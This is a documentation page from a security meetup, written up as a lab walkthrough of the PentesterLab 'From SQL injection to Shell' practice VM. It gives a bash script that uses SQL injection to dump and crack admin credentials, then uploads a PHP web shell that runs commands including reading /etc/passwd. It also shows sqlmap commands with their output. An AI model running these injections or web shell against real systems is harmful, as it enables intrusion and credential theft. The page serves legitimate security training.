

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.24. PentesterLab From SQL injection to Shell &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.25. SkyTower1" href="skytower1.html"/>
        <link rel="prev" title="3.23. PentesterLab From SQL injection to Shell II" href="from_sql_injection_to_shell_II.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.24. PentesterLab From SQL injection to Shell</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#manual-sql-injection">3.24.1. manual SQL injection</a></li>
<li class="toctree-l3"><a class="reference internal" href="#exploit-simplification-with-sqlmap">3.24.2. exploit simplification with sqlmap</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.24. PentesterLab From SQL injection to Shell</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/from_sql_injection_to_shell.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="pentesterlab-from-sql-injection-to-shell">
<span id="pentesterlabsqli2shell"></span><h1>3.24. PentesterLab From SQL injection to Shell<a class="headerlink" href="#pentesterlab-from-sql-injection-to-shell" title="Permalink to this headline">¶</a></h1>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://pentesterlab.com/exercises/from_sqli_to_shell/">PentesterLab From SQL injection to Shell</a>. PentesterLab’s writeup <a class="reference external" href="http://download.vulnhub.com/pentesterlab/from_sqli_to_shell.pdf">from_sqli_to_shell.pdf</a> is a very thorough and complete description of the browser-based approach to solving the challenge and we won’t reproduce that here. There are 2 other approaches: a command-line equivalent to the documented browser-based approach, and the much simpler approach using <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a>. Here we document the 2 other approaches: first we provide a quick-and-dirty shell script that can be cut-and-pasted into the command line; second, we show the impressively short <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. We recommend going through the manual browser or command line version of the challenge first to learn the concepts. Then step through the <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> version to appreciate all the steps handled by <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> behind the scenes.</p>
<p>The VM is provided as an iso file so should run on any virtualization platform. For configuration purposes the OS is Debian 6.0.5. The VM is called vulnerable and boots directly into a shell session.</p>
<div class="section" id="manual-sql-injection">
<h2>3.24.1. manual SQL injection<a class="headerlink" href="#manual-sql-injection" title="Permalink to this headline">¶</a></h2>
<p>Download <a class="reference download internal" href="../_downloads/from_sql_injection_to_shell_exploit.sh" download=""><code class="xref download docutils literal"><span class="pre">from_sql_injection_to_shell_exploit.sh</span></code></a>, the manual, step-by-step command line script for the challenge. Run <code class="docutils literal"><span class="pre">./from_sql_injection_to_shell_exploit.sh</span> <span class="pre">IP</span></code> where IP is vulnerable’s IP address.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$#</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;1&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="nv">$0</span> IP
  <span class="nb">exit</span>
<span class="k">fi</span>

<span class="nv">TARGET</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
<span class="nv">QUERY</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=&quot;</span>

<span class="c1"># function executing vulnerable MySQL query</span>
<span class="k">function</span> mysql_fetch<span class="o">()</span> <span class="o">{</span>
  <span class="nv">ARG</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="p">// /%20</span><span class="si">}</span><span class="s2">&quot;</span>
  <span class="nv">MYSQL_RET</span><span class="o">=</span><span class="k">$(</span>curl --silent <span class="nv">$QUERY$ARG</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="k">)</span>
  <span class="c1"># error message wrapped between &lt;div id=&quot;content&quot;&gt; and &lt;div class=...</span>
  <span class="nv">MYSQL_ERR</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="nv">$MYSQL_RET</span> <span class="p">|</span> <span class="se">\</span>
    sed -e <span class="s1">&#39;s/^.*&lt;div id=&quot;content&quot;&gt;//;</span>
<span class="s1">            s/&lt;div class=.*$//;</span>
<span class="s1">            s/^[ \t]*//;</span>
<span class="s1">            s/[ \t]*$//&#39;</span><span class="k">)</span>
<span class="o">}</span>

<span class="c1"># Determine number of columns prior to doing UNION</span>
<span class="c1"># Must have at least 2, start trying at 10 until hit 1 or find number of columns</span>
<span class="nb">echo</span> <span class="s2">&quot;Trying to determine the number of columns in the vulnerable query.&quot;</span>
<span class="nv">NCOLS</span><span class="o">=</span><span class="m">0</span>
<span class="nv">MAXCOL</span><span class="o">=</span><span class="m">10</span>
<span class="k">for</span> <span class="o">((</span> <span class="nv">i</span><span class="o">=</span>MAXCOL<span class="p">;</span> i&gt;<span class="o">=</span><span class="m">2</span><span class="p">;</span> i-- <span class="o">))</span><span class="p">;</span> <span class="k">do</span>
  mysql_fetch <span class="s2">&quot;0 ORDER BY </span><span class="nv">$i</span><span class="s2">&quot;</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$MYSQL_ERR</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">NCOLS</span><span class="o">=</span><span class="nv">$i</span>
    <span class="nb">break</span>
  <span class="k">fi</span>
<span class="k">done</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$NCOLS</span> <span class="o">==</span> <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&quot;UNION QUERY CANNOT WORK - QUITTING&quot;</span>
  <span class="nb">exit</span>
<span class="k">else</span>
  <span class="nb">echo</span> <span class="s2">&quot;Vulnerable query has </span><span class="nv">$NCOLS</span><span class="s2"> COLUMNS&quot;</span>
<span class="k">fi</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$NCOLS</span> -gt <span class="m">2</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nv">SUFFIX</span><span class="o">=</span><span class="k">$(</span><span class="nb">eval</span> <span class="nb">printf</span> <span class="s1">&#39;,%s&#39;</span> <span class="o">{</span><span class="m">3</span>..<span class="nv">$NCOLS</span><span class="o">}</span><span class="k">)</span>
<span class="k">else</span>
  <span class="nv">SUFFIX</span><span class="o">=</span>,
<span class="k">fi</span>

<span class="c1"># Let&#39;s look at the database info</span>
<span class="c1"># Must use column 2, the Picture name, to display info</span>
<span class="c1">#   @@version</span>
<span class="c1">#   current_user()</span>
<span class="c1">#   database()</span>
<span class="c1">#   table_name, column_name FROM information_schema.columns</span>

<span class="nb">echo</span> -e <span class="s2">&quot;\nDemo fetching DB version, current user, and database name:&quot;</span>
mysql_fetch <span class="s2">&quot;0 UNION SELECT 1,@@version</span><span class="nv">$SUFFIX</span><span class="s2">&quot;</span>
<span class="nv">VERSION</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_RET</span><span class="p">##*Picture: </span><span class="si">}</span>
<span class="nv">VERSION</span><span class="o">=</span><span class="si">${</span><span class="nv">VERSION</span><span class="p">%%&lt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="nv">VERSION</span><span class="o">=</span><span class="nv">$VERSION</span>

mysql_fetch <span class="s2">&quot;0 UNION SELECT 1,current_user()</span><span class="nv">$SUFFIX</span><span class="s2">&quot;</span>
<span class="nv">USER</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_RET</span><span class="p">##*Picture: </span><span class="si">}</span>
<span class="nv">USER</span><span class="o">=</span><span class="si">${</span><span class="nv">USER</span><span class="p">%%&lt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="nv">USER</span><span class="o">=</span><span class="nv">$USER</span>

mysql_fetch <span class="s2">&quot;0 UNION SELECT 1,database()</span><span class="nv">$SUFFIX</span><span class="s2">&quot;</span>
<span class="nv">DB</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_RET</span><span class="p">##*Picture: </span><span class="si">}</span>
<span class="nv">DB</span><span class="o">=</span><span class="si">${</span><span class="nv">DB</span><span class="p">%%&lt;*</span><span class="si">}</span>
<span class="nb">echo</span> <span class="nv">DB</span><span class="o">=</span><span class="nv">$DB</span>


<span class="c1"># List all tables</span>
mysql_fetch <span class="s2">&quot;0 UNION SELECT 1,table_name</span><span class="nv">$SUFFIX</span><span class="s2"> FROM information_schema.tables&quot;</span>
<span class="nb">echo</span> -e <span class="s2">&quot;\n==========\nTABLE LIST\n==========&quot;</span>
<span class="k">while</span> <span class="o">[[</span> <span class="nb">true</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span>
  <span class="nv">MYSQL_REST</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_RET</span><span class="p">#*Picture: </span><span class="si">}</span>
  <span class="o">[[</span> <span class="nv">$MYSQL_REST</span> <span class="o">==</span> <span class="nv">$MYSQL_RET</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span>
  <span class="nv">TABLE</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_REST</span><span class="p">%%&lt;*</span><span class="si">}</span>
  <span class="nb">echo</span> <span class="nv">$TABLE</span>
  <span class="nv">MYSQL_RET</span><span class="o">=</span><span class="nv">$MYSQL_REST</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="s2">&quot;==========&quot;</span>


<span class="c1"># List all columns in table users</span>
mysql_fetch <span class="s2">&quot;0 UNION SELECT 1,column_name</span><span class="nv">$SUFFIX</span><span class="s2"> FROM \</span>
<span class="s2">information_schema.columns WHERE table_name = &#39;users&#39;&quot;</span>
<span class="nb">echo</span> -e <span class="s2">&quot;\n=======================\nCOLUMN LIST TABLE users\n=======================&quot;</span>
<span class="k">while</span> <span class="o">[[</span> <span class="nb">true</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span>
  <span class="nv">MYSQL_REST</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_RET</span><span class="p">#*Picture: </span><span class="si">}</span>
  <span class="o">[[</span> <span class="nv">$MYSQL_REST</span> <span class="o">==</span> <span class="nv">$MYSQL_RET</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span>
  <span class="nv">COLUMN</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_REST</span><span class="p">%%&lt;*</span><span class="si">}</span>
  <span class="nb">echo</span> <span class="nv">$COLUMN</span>
  <span class="nv">MYSQL_RET</span><span class="o">=</span><span class="nv">$MYSQL_REST</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="s2">&quot;===========&quot;</span>


<span class="c1"># List all login:password in table users</span>
mysql_fetch <span class="s2">&quot;0 UNION SELECT 1,concat(login,&#39;:&#39;,password)</span><span class="nv">$SUFFIX</span><span class="s2"> FROM users&quot;</span>
<span class="nb">echo</span> -e <span class="s2">&quot;\n=========\nUSER LIST\n=========&quot;</span>
<span class="k">while</span> <span class="o">[[</span> <span class="nb">true</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span>
  <span class="nv">MYSQL_REST</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_RET</span><span class="p">#*Picture: </span><span class="si">}</span>
  <span class="o">[[</span> <span class="nv">$MYSQL_REST</span> <span class="o">==</span> <span class="nv">$MYSQL_RET</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span>
  <span class="nv">USER</span><span class="o">=</span><span class="si">${</span><span class="nv">MYSQL_REST</span><span class="p">%%&lt;*</span><span class="si">}</span>
  <span class="nb">echo</span> <span class="nv">$USER</span>
  <span class="nv">MYSQL_RET</span><span class="o">=</span><span class="nv">$MYSQL_REST</span>
<span class="k">done</span>
<span class="nb">echo</span> <span class="s2">&quot;=========&quot;</span>


<span class="c1"># crack the password using the rockyou wordlist</span>
<span class="nb">echo</span> <span class="s2">&quot;admin:8efe310f9ab3efeae8d410a8e0166eb2&quot;</span> &gt; md5.txt
zcat /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
<span class="nb">echo</span> -e <span class="s2">&quot;\nCracking the password with john:&quot;</span>
/usr/sbin/john md5.txt --format<span class="o">=</span>raw-md5 --wordlist<span class="o">=</span>rockyou.txt
cat ~/.john/john.pot


<span class="c1"># using admin/P4ssw0rd upload a shell execution php script and run a few commands</span>
<span class="nb">echo</span> -e <span class="s2">&quot;\nUploading shell.php3 then using it to execute shell commands on vulnerable:&quot;</span>
cat &gt;shell.php3 <span class="s">&lt;&lt;EOF</span>
<span class="s">&lt;?php</span>
<span class="s">system(\$_GET[&#39;cmd&#39;]);</span>
<span class="s">?&gt;</span>
<span class="s">EOF</span>
curl --silent --form <span class="nv">action</span><span class="o">=</span>index.php --form <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;shell&quot;</span> <span class="se">\</span>
    --form <span class="nv">image</span><span class="o">=</span><span class="s2">&quot;@shell.php3;type=text/plain&quot;</span> --form <span class="nv">category</span><span class="o">=</span><span class="m">1</span> <span class="se">\</span>
    --form <span class="nv">Add</span><span class="o">=</span><span class="s2">&quot;Add&quot;</span> --form <span class="nv">user</span><span class="o">=</span>admin --form <span class="nv">password</span><span class="o">=</span>P4ssw0rd <span class="se">\</span>
    http://<span class="nv">$TARGET</span>/admin/index.php <span class="p">|</span> <span class="se">\</span>
    grep INSERT
<span class="nb">echo</span> -e <span class="s2">&quot;\nRun the command \&quot;uname -a\&quot;&quot;</span>
curl --silent http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3?cmd<span class="o">=</span>uname%20-a
<span class="nb">echo</span> -e <span class="s2">&quot;\nRun the command \&quot;cat /etc/passwd\&quot;&quot;</span>
curl --silent http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3?cmd<span class="o">=</span>cat%20/etc/passwd
</pre></div>
</div>
</div>
<div class="section" id="exploit-simplification-with-sqlmap">
<h2>3.24.2. exploit simplification with sqlmap<a class="headerlink" href="#exploit-simplification-with-sqlmap" title="Permalink to this headline">¶</a></h2>
<p>Here is the much simpler <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. Change TARGET to vulnerable’s IP address. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is run 4 times: (1) to verify SQL injection is possible; (2) to list available databases; (3) to list tables within a selected database; then (4) to dump the selected table (users). <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> provided the added benefit of cracking the password found in the users table. We leave off the uploading of the exploitation php script which you can use from the last few lines of the command line script immediately above. Here is the <code class="docutils literal"><span class="pre">bash</span></code> code:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="c1"># Check to see if sql injection possible</span>
rm -rf sqlmap
sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql
<span class="c1"># Get available databases</span>
sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql --dbs
<span class="c1"># List tables in photoblog table</span>
sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql -D photoblog --tables
<span class="c1"># Dump the users table - sqlmap actually cracks the password too</span>
sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql -D photoblog -T users --dump
</pre></div>
</div>
<p>And here is the output from running the <code class="docutils literal"><span class="pre">bash</span></code> code:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="gp">hacker@kali:~$ #</span> Check to see <span class="k">if</span> sql injection possible
<span class="gp">hacker@kali:~$</span> sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">sqlmap identified the following injection points with a total of 40 HTTP(s) requests:</span>
<span class="go">---</span>
<span class="go">Place: GET</span>
<span class="go">Parameter: id</span>
<span class="go">    Type: boolean-based blind</span>
<span class="go">    Title: AND boolean-based blind - WHERE or HAVING clause</span>
<span class="go">    Payload: id=1 AND 1633=1633</span>

<span class="go">    Type: error-based</span>
<span class="go">    Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</span>
<span class="go">    Payload: id=1 AND (SELECT 7688 FROM(SELECT COUNT(*),CONCAT(0x7176797571,(SELECT (CASE WHEN (7688=7688) THEN 1 ELSE 0 END)),0x7177736d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span>

<span class="go">    Type: UNION query</span>
<span class="go">    Title: MySQL UNION query (NULL) - 4 columns</span>
<span class="go">    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7176797571,0x6f457757694572625645,0x7177736d71),NULL,NULL#</span>

<span class="go">    Type: AND/OR time-based blind</span>
<span class="go">    Title: MySQL &gt; 5.0.11 AND time-based blind</span>
<span class="go">    Payload: id=1 AND SLEEP(5)</span>
<span class="go">---</span>
<span class="go">[17:54:25] [INFO] the back-end DBMS is MySQL</span>
<span class="go">web server operating system: Linux Debian 6.0 (squeeze)</span>
<span class="go">web application technology: PHP 5.3.3, Apache 2.2.16</span>
<span class="go">back-end DBMS: MySQL 5.0</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~$ #</span> Get available databases
<span class="gp">hacker@kali:~$</span> sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql --dbs
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">available databases [2]:</span>
<span class="go">[*] information_schema</span>
<span class="go">[*] photoblog</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~$ #</span> List tables in photoblog table
<span class="gp">hacker@kali:~$</span> sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql -D photoblog --tables
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">[17:59:18] [INFO] fetching tables for database: &#39;photoblog&#39;</span>
<span class="go">Database: photoblog</span>
<span class="go">[3 tables]</span>
<span class="go">+------------+</span>
<span class="go">| categories |</span>
<span class="go">| pictures   |</span>
<span class="go">| users      |</span>
<span class="go">+------------+</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~$ #</span> Dump the users table - sqlmap actually cracks the password too
<span class="gp">hacker@kali:~$</span> sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
    --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql -D photoblog -T users --dump
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">[18:00:51] [INFO] cracked password &#39;P4ssw0rd&#39; for hash &#39;8efe310f9ab3efeae8d410a8e0166eb2&#39;</span>
<span class="go">[18:01:55] [INFO] postprocessing table dump</span>
<span class="go">Database: photoblog</span>
<span class="go">Table: users</span>
<span class="go">[1 entry]</span>
<span class="go">+----+-------+---------------------------------------------+</span>
<span class="go">| id | login | password                                    |</span>
<span class="go">+----+-------+---------------------------------------------+</span>
<span class="go">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span>
<span class="go">+----+-------+---------------------------------------------+</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="skytower1.html" class="btn btn-neutral float-right" title="3.25. SkyTower1" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="from_sql_injection_to_shell_II.html" class="btn btn-neutral" title="3.23. PentesterLab From SQL injection to Shell II" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>